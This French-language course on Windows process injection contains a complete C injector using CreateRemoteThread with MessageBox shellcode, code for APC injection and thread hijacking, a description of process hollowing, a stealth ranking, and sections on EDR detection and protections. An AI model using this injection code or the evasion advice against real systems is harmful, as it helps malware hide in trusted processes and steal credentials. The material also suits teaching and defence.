# Cours : Process Injection - Injection de Code dans un Processus

## 1. Introduction - Qu'est-ce que l'Injection de Processus ?

### 1.1 Le Concept pour Débutants

**Process Injection** = Injecter du code dans un **autre processus** en cours d'exécution.

**Analogie** : Imaginez deux maisons (processus) :
- **Maison A** : Votre programme malveillant
- **Maison B** : Programme légitime (notepad.exe, explorer.exe)

**Injection** = Entrer dans la Maison B et y installer votre code.

```ascii
AVANT INJECTION :

Processus Malware          Processus Cible (notepad.exe)
┌──────────────┐           ┌──────────────┐
│ malware.exe  │           │ notepad.exe  │
│ PID: 1234    │           │ PID: 5678    │
│              │           │              │
│ Code evil    │           │ Code légitime│
│              │           │              │
└──────────────┘           └──────────────┘
   Suspect                    Légitime
   
APRÈS INJECTION :

Processus Malware          Processus Cible (notepad.exe)
┌──────────────┐           ┌──────────────────────┐
│ malware.exe  │           │ notepad.exe          │
│ PID: 1234    │    ┌─────→│ PID: 5678            │
│              │    │      │                      │
│ Injecte ─────┘    │      │ Code légitime        │
│                   │      │                      │
└──────────────┘    │      │ ┌──────────────────┐ │
                    └──────┼─│ Code injecté (!) │ │
                           │ └──────────────────┘ │
                           └──────────────────────┘
                              Apparaît légitime
                              (utilise le nom/droits de notepad)
```

### 1.2 Pourquoi Faire de l'Injection ?

**Raisons offensives (Red Team)** :

1. **Camouflage** : Votre code s'exécute sous le nom d'un processus légitime
2. **Privilèges** : Hériter des permissions du processus cible
3. **Persistence** : Survivre au redémarrage si le processus redémarre
4. **Bypass EDR** : Éviter la détection (code dans processus de confiance)
5. **Lateral Movement** : Se déplacer vers d'autres machines

```ascii
EXEMPLE : Injection dans lsass.exe (Windows)

lsass.exe = Gestionnaire d'authentification Windows
          = S'exécute avec privilèges SYSTEM
          = Processus de confiance (jamais tué)

Malware → Injecte dans lsass.exe
       → Hérite droits SYSTEM
       → Peut dump les mots de passe
       → EDR ne suspecte pas lsass.exe
```

## 2. Les Briques de Base - APIs Windows

### 2.1 OpenProcess() - Ouvrir un "Handle"

**Qu'est-ce qu'un Handle ?**

Un **handle** est comme un **ticket d'accès** à un processus.

```ascii
ANALOGIE : Ticket de concert

Sans ticket :
┌──────────┐     ❌      ┌──────────┐
│   Vous   │  ─────────→ │ Concert  │
└──────────┘   Refusé    └──────────┘

Avec ticket (Handle) :
┌──────────┐     ✅      ┌──────────┐
│   Vous   │  ─────────→ │ Concert  │
│  🎫      │   Accepté   │          │
└──────────┘             └──────────┘

En Windows :
Handle = Permission d'accéder au processus
```

**Code** :
```c
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,  // Droits demandés (tous les droits)
    FALSE,               // Héritage (non)
    targetPID            // PID du processus cible
);
```

**Décortiquons chaque paramètre** :

```ascii
┌─────────────────────────────────────────────────────┐
│  PROCESS_ALL_ACCESS                                 │
├─────────────────────────────────────────────────────┤
│  Flags combinés :                                   │
│  ├─ PROCESS_VM_WRITE     (écrire en mémoire)        │
│  ├─ PROCESS_VM_OPERATION (allouer/protéger)         │
│  ├─ PROCESS_CREATE_THREAD (créer des threads)       │
│  └─ ...                                             │
│                                                     │
│  C'est comme demander : "Je veux TOUT faire"       │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  FALSE (pas d'héritage)                             │
├─────────────────────────────────────────────────────┤
│  Si TRUE : Les processus enfants hériteraient       │
│            de ce handle                             │
│  Si FALSE : Seulement notre processus l'utilise     │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  targetPID (ex: 5678)                               │
├─────────────────────────────────────────────────────┤
│  Process ID de la cible                             │
│  Obtenu via :                                       │
│  - Task Manager                                     │
│  - CreateToolhelp32Snapshot()                       │
│  - Énumération de processus                         │
└─────────────────────────────────────────────────────┘
```

**Vérifier le succès** :

```c
if (hProcess == NULL) {
    printf("Erreur : %lu\n", GetLastError());
    // Raisons possibles :
    // - Processus n'existe pas
    // - Permissions insuffisantes
    // - Processus protégé (PPL)
}
```

### 2.2 VirtualAllocEx() - Allouer de la Mémoire Distante

**Qu'est-ce que ça fait ?**

Réserver de la mémoire **dans un autre processus**.

```ascii
PROCESSUS CIBLE (notepad.exe) :

AVANT VirtualAllocEx() :

┌──────────────────────────────────┐
│  Mémoire de notepad.exe          │
├──────────────────────────────────┤
│  Code de notepad                 │
│  Données de notepad              │
│  ... espace libre ...            │
│  ... espace libre ...            │
└──────────────────────────────────┘

APRÈS VirtualAllocEx(hProcess, ..., 4096, ...) :

┌──────────────────────────────────┐
│  Mémoire de notepad.exe          │
├──────────────────────────────────┤
│  Code de notepad                 │
│  Données de notepad              │
│  ... espace libre ...            │
├──────────────────────────────────┤
│  ┌────────────────────────────┐  │  ← ALLOUÉ !
│  │  4096 bytes réservés       │  │
│  │  Adresse : 0x00A00000      │  │
│  └────────────────────────────┘  │
│  ... espace libre ...            │
└──────────────────────────────────┘
```

**Code** :
```c
LPVOID remoteBuffer = VirtualAllocEx(
    hProcess,           // Handle du processus cible
    NULL,               // Adresse (NULL = système choisit)
    4096,               // Taille (4 KB)
    MEM_COMMIT | MEM_RESERVE,  // Type d'allocation
    PAGE_EXECUTE_READWRITE     // Permissions (RWX)
);
```

**Paramètres expliqués** :

```ascii
┌─────────────────────────────────────────────────────┐
│  MEM_COMMIT | MEM_RESERVE                           │
├─────────────────────────────────────────────────────┤
│  MEM_RESERVE :                                      │
│  └─ "Réserve" les adresses (pas encore utilisables) │
│                                                     │
│  MEM_COMMIT :                                       │
│  └─ "Valide" les pages (maintenant utilisables)    │
│                                                     │
│  Les deux ensemble = Alloue et active directement  │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  PAGE_EXECUTE_READWRITE                             │
├─────────────────────────────────────────────────────┤
│  R = Read (lecture autorisée)                       │
│  W = Write (écriture autorisée)                     │
│  X = Execute (exécution autorisée)                  │
│                                                     │
│  RWX = Mémoire où on peut :                        │
│  1. Écrire du code (W)                              │
│  2. Lire le code (R)                                │
│  3. Exécuter le code (X)                            │
│                                                     │
│  ⚠️ RWX est SUSPECT (détecté par EDR)              │
└─────────────────────────────────────────────────────┘
```

### 2.3 WriteProcessMemory() - Écrire dans la Mémoire Distante

**Copier nos données** dans la mémoire allouée.

```c
BOOL success = WriteProcessMemory(
    hProcess,        // Processus cible
    remoteBuffer,    // Adresse distante (où écrire)
    shellcode,       // Notre code (source)
    shellcodeSize,   // Taille
    NULL             // Bytes écrits (optionnel)
);
```

**Visualisation** :

```ascii
NOTRE PROCESSUS (malware.exe) :

┌──────────────────────────────────┐
│  Shellcode (local)               │
│  0x00401000:                     │
│  ┌────────────────────────────┐  │
│  │ \x48\x31\xc0\x50...        │  │
│  │ (code machine)             │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘
         │
         │ WriteProcessMemory()
         │ Copie via API Windows
         ↓
PROCESSUS CIBLE (notepad.exe) :

┌──────────────────────────────────┐
│  Mémoire distante                │
│  0x00A00000:                     │
│  ┌────────────────────────────┐  │
│  │ \x48\x31\xc0\x50...        │  │  ← Copié !
│  │ (code machine)             │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘

Maintenant le shellcode est DANS notepad.exe
```

### 2.4 CreateRemoteThread() - Exécuter le Code Injecté

**Créer un thread** dans le processus distant qui exécute notre code.

```c
HANDLE hThread = CreateRemoteThread(
    hProcess,                         // Processus cible
    NULL,                             // Security attributes
    0,                                // Stack size (0 = default)
    (LPTHREAD_START_ROUTINE)remoteBuffer,  // Fonction à exécuter
    NULL,                             // Paramètre à passer
    0,                                // Flags (0 = démarre immédiatement)
    NULL                              // Thread ID (optionnel)
);
```

**Ce qui se passe** :

```ascii
PROCESSUS CIBLE (notepad.exe) :

AVANT CreateRemoteThread() :

Threads existants :
┌────────────────┐
│ Thread Main    │  ← Thread principal de notepad
│ (UI loop)      │
└────────────────┘

APRÈS CreateRemoteThread() :

┌────────────────┐
│ Thread Main    │  ← Thread original (continue)
│ (UI loop)      │
└────────────────┘

┌────────────────┐
│ Thread Injecté │  ← NOUVEAU thread créé !
│ Exécute :      │
│ 0x00A00000     │  ← Pointe vers notre shellcode
│ (shellcode)    │
└────────────────┘

notepad.exe a maintenant 2 threads :
- Thread légitime (interface)
- Thread malveillant (notre code)
```

## 3. Technique #1 : CreateRemoteThread (Classique)

### 3.1 L'Algorithme Complet

```ascii
╔═══════════════════════════════════════════════════════╗
║  INJECTION CREATEREMOTETHREAD - 5 ÉTAPES              ║
╚═══════════════════════════════════════════════════════╝

ÉTAPE 1 : OUVRIR LE PROCESSUS CIBLE
├─ OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID)
└─ Obtenir un handle (ticket d'accès)

        ↓

ÉTAPE 2 : ALLOUER MÉMOIRE DANS LA CIBLE
├─ VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
└─ Réserver un espace pour notre code

        ↓

ÉTAPE 3 : ÉCRIRE LE SHELLCODE
├─ WriteProcessMemory(hProcess, remoteAddr, shellcode, size, NULL)
└─ Copier notre code dans l'espace alloué

        ↓

ÉTAPE 4 : CRÉER UN THREAD DISTANT
├─ CreateRemoteThread(hProcess, NULL, 0, remoteAddr, NULL, 0, NULL)
└─ Démarrer l'exécution du shellcode

        ↓

ÉTAPE 5 : NETTOYER (optionnel)
├─ CloseHandle(hThread)
└─ CloseHandle(hProcess)
```

### 3.2 Code Complet Annoté

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    // PID de la cible (ex: notepad.exe)
    DWORD targetPID = atoi(argv[1]);
    
    // Shellcode : MessageBox("Pwned!", "Hack", MB_OK)
    unsigned char shellcode[] = 
        "\x48\x83\xec\x28"              // sub rsp, 0x28 (align stack)
        "\x48\x31\xc9"                  // xor rcx, rcx (NULL)
        "\x48\x8d\x15\x0c\x00\x00\x00"  // lea rdx, [message]
        "\x4c\x8d\x05\x13\x00\x00\x00"  // lea r8, [title]
        "\x48\x31\xc9"                  // xor rcx, rcx
        "\x48\xb8"                      // mov rax, <MessageBoxA addr>
        "\x00\x00\x00\x00\x00\x00\x00\x00"  // À patcher
        "\xff\xd0"                      // call rax
        "\x48\x83\xc4\x28"              // add rsp, 0x28
        "\xc3"                          // ret
        "Pwned!\0"                      // Message
        "Hack\0";                       // Titre
    
    size_t shellcodeSize = sizeof(shellcode) - 1;
    
    printf("[+] Cible : PID %lu\n", targetPID);
    printf("[+] Shellcode : %zu bytes\n", shellcodeSize);
    
    // ════════════════════════════════════════════════════
    // ÉTAPE 1 : Ouvrir le processus cible
    // ════════════════════════════════════════════════════
    printf("[*] Ouverture du processus...\n");
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // Tous les droits
        FALSE,
        targetPID
    );
    
    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        printf("    Raisons possibles :\n");
        printf("    - Processus n'existe pas\n");
        printf("    - Permissions insuffisantes (besoin admin)\n");
        printf("    - Processus protégé (PPL)\n");
        return 1;
    }
    printf("[+] Handle obtenu : 0x%p\n", hProcess);
    
    // ════════════════════════════════════════════════════
    // ÉTAPE 2 : Allouer mémoire dans le processus distant
    // ════════════════════════════════════════════════════
    printf("[*] Allocation mémoire distante...\n");
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,                    // Dans ce processus
        NULL,                        // Adresse (système choisit)
        shellcodeSize,               // Taille
        MEM_COMMIT | MEM_RESERVE,    // Allouer + valider
        PAGE_EXECUTE_READWRITE       // RWX (exécutable)
    );
    
    if (remoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Mémoire allouée à : 0x%p\n", remoteBuffer);
    
    // ════════════════════════════════════════════════════
    // ÉTAPE 3 : Écrire le shellcode
    // ════════════════════════════════════════════════════
    printf("[*] Écriture du shellcode...\n");
    SIZE_T bytesWritten;
    BOOL writeSuccess = WriteProcessMemory(
        hProcess,        // Processus cible
        remoteBuffer,    // Où écrire
        shellcode,       // Quoi écrire
        shellcodeSize,   // Combien
        &bytesWritten    // Bytes effectivement écrits
    );
    
    if (!writeSuccess) {
        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] %zu bytes écrits\n", bytesWritten);
    
    // ════════════════════════════════════════════════════
    // ÉTAPE 4 : Créer thread distant pour exécuter
    // ════════════════════════════════════════════════════
    printf("[*] Création du thread distant...\n");
    HANDLE hThread = CreateRemoteThread(
        hProcess,                             // Processus cible
        NULL,                                 // Security
        0,                                    // Stack size
        (LPTHREAD_START_ROUTINE)remoteBuffer, // Point d'entrée
        NULL,                                 // Paramètre
        0,                                    // Flags (démarrer)
        NULL                                  // Thread ID
    );
    
    if (hThread == NULL) {
        printf("[-] Erreur CreateRemoteThread: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread créé : 0x%p\n", hThread);
    
    // ════════════════════════════════════════════════════
    // ÉTAPE 5 : Attendre et nettoyer
    // ════════════════════════════════════════════════════
    printf("[*] Attente fin du thread...\n");
    WaitForSingleObject(hThread, INFINITE);  // Attendre la fin
    
    printf("[+] Injection réussie !\n");
    
    // Nettoyer
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

## 4. Technique #2 : QueueUserAPC - Plus Furtive

### 4.1 Qu'est-ce qu'une APC ?

**APC** = Asynchronous Procedure Call (Appel de Procédure Asynchrone)

C'est une **file d'attente** où le système Windows met des fonctions à exécuter quand un thread est en "état d'alerte".

```ascii
THREAD avec APC Queue :

Thread en exécution :
┌──────────────────────────┐
│ Code normal du thread    │
│ ...                      │
│ WaitForSingleObject()    │  ← Thread entre en "alertable state"
│ ...                      │
└──────────────────────────┘
           │
           ↓ Thread devient "alertable"
           
APC Queue (File des APC) :
┌──────────────────────────┐
│ APC 1 : fonction_a()     │  ← Ajoutée par le système
│ APC 2 : fonction_b()     │  ← Ajoutée par un driver
│ APC 3 : NOTRE_SHELLCODE()│  ← Ajoutée par nous ! (QueueUserAPC)
└──────────────────────────┘
           │
           ↓ Thread exécute toutes les APC
           
Thread exécute :
1. fonction_a()
2. fonction_b()
3. NOTRE_SHELLCODE()  ← Notre code s'exécute !
4. Retour au code normal
```

**Pourquoi c'est plus furtif ?**

- ✅ Pas de `CreateRemoteThread()` (moins détecté)
- ✅ Utilise un thread existant (pas de nouveau thread suspect)
- ✅ Exécution différée (quand le thread devient alertable)

### 4.2 Code QueueUserAPC

```c
// Après avoir alloué et écrit le shellcode...

// Trouver un thread dans le processus cible
HANDLE hThread = OpenThread(
    THREAD_SET_CONTEXT,  // Permission de modifier le thread
    FALSE,
    targetThreadID       // ID du thread cible
);

// Ajouter notre shellcode à la APC queue
QueueUserAPC(
    (PAPCFUNC)remoteBuffer,  // Notre shellcode
    hThread,                  // Thread cible
    NULL                      // Paramètre
);

// Le shellcode s'exécutera quand le thread devient alertable
// (ex: appel à SleepEx, WaitForSingleObjectEx, etc.)
```

**Timeline** :

```ascii
T=0s   : QueueUserAPC() ajoute shellcode à la queue
         Thread continue son exécution normale
         
T=5s   : Thread appelle WaitForSingleObjectEx(..., TRUE)
                                                  └─ Alertable !
         
T=5s   : Thread devient alertable
         └─ Exécute les APC en attente
            └─ Notre shellcode s'exécute ! 🎯
            
T=10s  : Shellcode termine
         Thread reprend son exécution normale
```

## 5. Technique #3 : Process Hollowing - La Substitution

### 5.1 Le Concept

**Process Hollowing** = Créer un processus légitime, le **vider**, et y mettre notre code.

**Analogie** : Comme un **déguisement parfait**
- Vous prenez l'apparence de notepad.exe
- Mais à l'intérieur, c'est votre code qui tourne

```ascii
┌─────────────────────────────────────────────────────┐
│  ÉTAPE 1 : Créer processus SUSPENDU                 │
├─────────────────────────────────────────────────────┤
│  CreateProcess(..., CREATE_SUSPENDED, ...)          │
│                                                     │
│  ┌──────────────┐                                   │
│  │ notepad.exe  │  ← Créé mais PAS démarré         │
│  │ (suspendu)   │     (threads pas encore actifs)  │
│  └──────────────┘                                   │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  ÉTAPE 2 : VIDER le processus                       │
├─────────────────────────────────────────────────────┤
│  NtUnmapViewOfSection(hProcess, baseAddress)        │
│                                                     │
│  ┌──────────────┐                                   │
│  │ notepad.exe  │                                   │
│  │ ░░░░ VIDE ░░ │  ← Code de notepad supprimé !    │
│  └──────────────┘                                   │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  ÉTAPE 3 : INJECTER notre executable               │
├─────────────────────────────────────────────────────┤
│  VirtualAllocEx() + WriteProcessMemory()            │
│                                                     │
│  ┌──────────────┐                                   │
│  │ notepad.exe  │                                   │
│  │ NOTRE CODE ! │  ← Notre PE injecté              │
│  └──────────────┘                                   │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  ÉTAPE 4 : MODIFIER le point d'entrée               │
├─────────────────────────────────────────────────────┤
│  SetThreadContext() pour pointer vers notre code    │
│                                                     │
│  Thread principal pointera vers notre entry point  │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  ÉTAPE 5 : REPRENDRE l'exécution                    │
├─────────────────────────────────────────────────────┤
│  ResumeThread() démarre le processus                │
│                                                     │
│  ┌──────────────┐                                   │
│  │ notepad.exe  │  ← Nom légitime                  │
│  │ (NOTRE CODE) │  ← Mais exécute notre code       │
│  │ ACTIF ✅     │                                   │
│  └──────────────┘                                   │
└─────────────────────────────────────────────────────┘

RÉSULTAT :
- Task Manager affiche "notepad.exe"
- Mais c'est NOTRE code qui tourne
- Déguisement parfait !
```

### 5.2 Visualisation Mémoire Détaillée

```ascii
PROCESSUS notepad.exe ORIGINAL :

┌──────────────────────────────────────────────┐
│  0x00400000 : Mach Header (PE Header)        │
│  0x00401000 : .text (code de notepad)        │
│  0x00500000 : .data (données de notepad)     │
│  0x00600000 : .rdata (constantes)            │
└──────────────────────────────────────────────┘

APRÈS Process Hollowing :

┌──────────────────────────────────────────────┐
│  0x00400000 : NOTRE PE Header                │  ← Remplacé
│  0x00401000 : NOTRE .text (notre code)       │  ← Remplacé
│  0x00500000 : NOTRE .data (nos données)      │  ← Remplacé
│  0x00600000 : NOTRE .rdata                   │  ← Remplacé
└──────────────────────────────────────────────┘

L'enveloppe (nom du processus) reste "notepad.exe"
Mais le contenu est complètement différent !
```

## 6. Technique #4 : Thread Hijacking - Détournement

### 6.1 Le Concept

Au lieu de créer un **nouveau thread**, on **détourne** un thread existant.

```ascii
ÉTAPES :

1. Trouver un thread dans le processus cible
2. SUSPENDRE le thread (SuspendThread)
3. SAUVEGARDER son contexte (GetThreadContext)
4. MODIFIER RIP pour pointer vers notre shellcode
5. RESTAURER le contexte (SetThreadContext)
6. REPRENDRE le thread (ResumeThread)

VISUALISATION :

Thread avant hijack :
┌──────────────────────┐
│ Thread exécute :     │
│ 0x00401234          │  ← RIP (instruction actuelle)
│ (code légitime)      │
└──────────────────────┘

Thread suspendu :
┌──────────────────────┐
│ Thread SUSPENDU      │
│ État sauvegardé      │
└──────────────────────┘

Modification contexte :
┌──────────────────────┐
│ RIP = 0x00A00000     │  ← Pointé vers shellcode
│ (notre code)         │
└──────────────────────┘

Thread repris :
┌──────────────────────┐
│ Thread exécute :     │
│ 0x00A00000          │  ← Notre shellcode !
│ (shellcode)          │
└──────────────────────┘
```

### 6.2 Code Thread Hijacking

```c
// Contexte = État complet du thread (tous les registres)
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;

// Suspendre le thread
SuspendThread(hThread);

// Lire l'état actuel
GetThreadContext(hThread, &ctx);

printf("[*] RIP avant : 0x%llx\n", ctx.Rip);

// Modifier RIP pour pointer vers notre shellcode
ctx.Rip = (DWORD64)remoteBuffer;

printf("[*] RIP après : 0x%llx\n", ctx.Rip);

// Appliquer le nouveau contexte
SetThreadContext(hThread, &ctx);

// Reprendre le thread (il exécutera notre shellcode)
ResumeThread(hThread);
```

**Qu'est-ce que RIP ?**

```ascii
RIP (Instruction Pointer) = Pointeur d'instruction

C'est un REGISTRE CPU qui contient l'adresse
de l'instruction EN COURS D'EXÉCUTION

┌──────────────────────────────────────┐
│  REGISTRES CPU                       │
├──────────────────────────────────────┤
│  RAX : 0x0000000000000042            │
│  RBX : 0x00007FFF12345678            │
│  RCX : 0x0000000000000000            │
│  ...                                 │
│  RIP : 0x0000000000401234            │  ← Ici !
│        └──────────────────┘          │
│        Adresse de l'instruction      │
│        courante                      │
└──────────────────────────────────────┘
           │
           ↓ CPU lit l'instruction à cette adresse
           
MÉMOIRE :
0x00401234  │ mov rax, rbx  │  ← Instruction courante
            
CPU exécute cette instruction, puis RIP++
```

## 7. Tableau Comparatif des Techniques

```ascii
┌────────────────────┬────────────┬──────────────┬─────────────┐
│ Technique          │ Furtivité  │ Complexité   │ Détection   │
├────────────────────┼────────────┼──────────────┼─────────────┤
│ CreateRemoteThread │ ⭐         │ Facile       │ Très haute  │
│                    │ Évidente   │              │ (Sysmon E8) │
├────────────────────┼────────────┼──────────────┼─────────────┤
│ QueueUserAPC       │ ⭐⭐⭐     │ Moyenne      │ Moyenne     │
│                    │ Furtive    │              │             │
├────────────────────┼────────────┼──────────────┼─────────────┤
│ Process Hollowing  │ ⭐⭐⭐⭐   │ Complexe     │ Faible      │
│                    │ Très       │              │ (si bien    │
│                    │ furtive    │              │  fait)      │
├────────────────────┼────────────┼──────────────┼─────────────┤
│ Thread Hijacking   │ ⭐⭐⭐⭐⭐ │ Très         │ Très faible │
│                    │ Extrême    │ complexe     │             │
└────────────────────┴────────────┴──────────────┴─────────────┘
```

## 8. Détection par EDR

### 8.1 Indicateurs de Compromission

```ascii
CE QUE L'EDR SURVEILLE :

1. Appels API suspects :
   ┌────────────────────────────────────┐
   │ OpenProcess(PROCESS_ALL_ACCESS)    │  ← Suspect
   │ VirtualAllocEx(..., PAGE_RWX)      │  ← Très suspect
   │ WriteProcessMemory()               │  ← Suspect
   │ CreateRemoteThread()               │  ← RED FLAG !
   └────────────────────────────────────┘

2. Mémoire anormale :
   ┌────────────────────────────────────┐
   │ Pages RWX (Read+Write+Execute)     │  ← Dangereux
   │ PE headers dans régions inhabituelles│
   │ Code non signé en mémoire          │
   └────────────────────────────────────┘

3. Comportements suspects :
   ┌────────────────────────────────────┐
   │ notepad.exe fait des connexions    │  ← Anormal
   │ svchost.exe injecté par malware.exe│  ← Red flag
   │ Processus légitime avec code non signé│
   └────────────────────────────────────┘
```

## 9. Protections Modernes

```ascii
┌──────────────────────┬──────────────────────────────┐
│ Protection           │ Comment ça fonctionne        │
├──────────────────────┼──────────────────────────────┤
│ PPL                  │ Protected Process Light      │
│ (Protected Process)  │ Empêche OpenProcess()        │
│                      │ (ex: lsass.exe, csrss.exe)   │
├──────────────────────┼──────────────────────────────┤
│ ACG                  │ Arbitrary Code Guard         │
│                      │ Empêche pages RWX            │
├──────────────────────┼──────────────────────────────┤
│ CIG                  │ Code Integrity Guard         │
│                      │ Vérifie signatures de code   │
├──────────────────────┼──────────────────────────────┤
│ CFG                  │ Control Flow Guard           │
│                      │ Valide les appels indirects  │
└──────────────────────┴──────────────────────────────┘
```

## Ressources

- [Process Injection Techniques](https://attack.mitre.org/techniques/T1055/)
- [Injection Methods](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [Windows Internals](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)

